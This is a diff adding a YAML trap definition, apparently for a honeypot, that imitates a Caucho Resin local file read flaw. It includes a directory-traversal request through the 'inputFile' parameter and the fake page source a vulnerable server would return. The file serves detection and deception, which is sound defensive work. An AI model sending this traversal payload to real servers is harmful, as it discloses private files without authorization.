@@ -1,0 +1,24 @@
+id: resin-inputfile-fileread
+info:
+  name: Caucho Resin LFR
+  author: princechaddha
+  description: A vulnerability in Caucho Resin allows remote unauthenticated users
+    to utilize the 'inputFile' variable to include the content of locally stored files
+    and disclose their content.
+  severity: high
+  reference:
+  - https://blkstone.github.io/2017/10/30/resin-attack-vectors/
+  metadata:
+    max-request: 1
+  tags: resin,caucho,lfr
+traps:
+- request:
+    method: GET
+    path: /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: '%@ page session="false" import="com.caucho.vfs.*, com.caucho.server.webapp.*"
+      %'
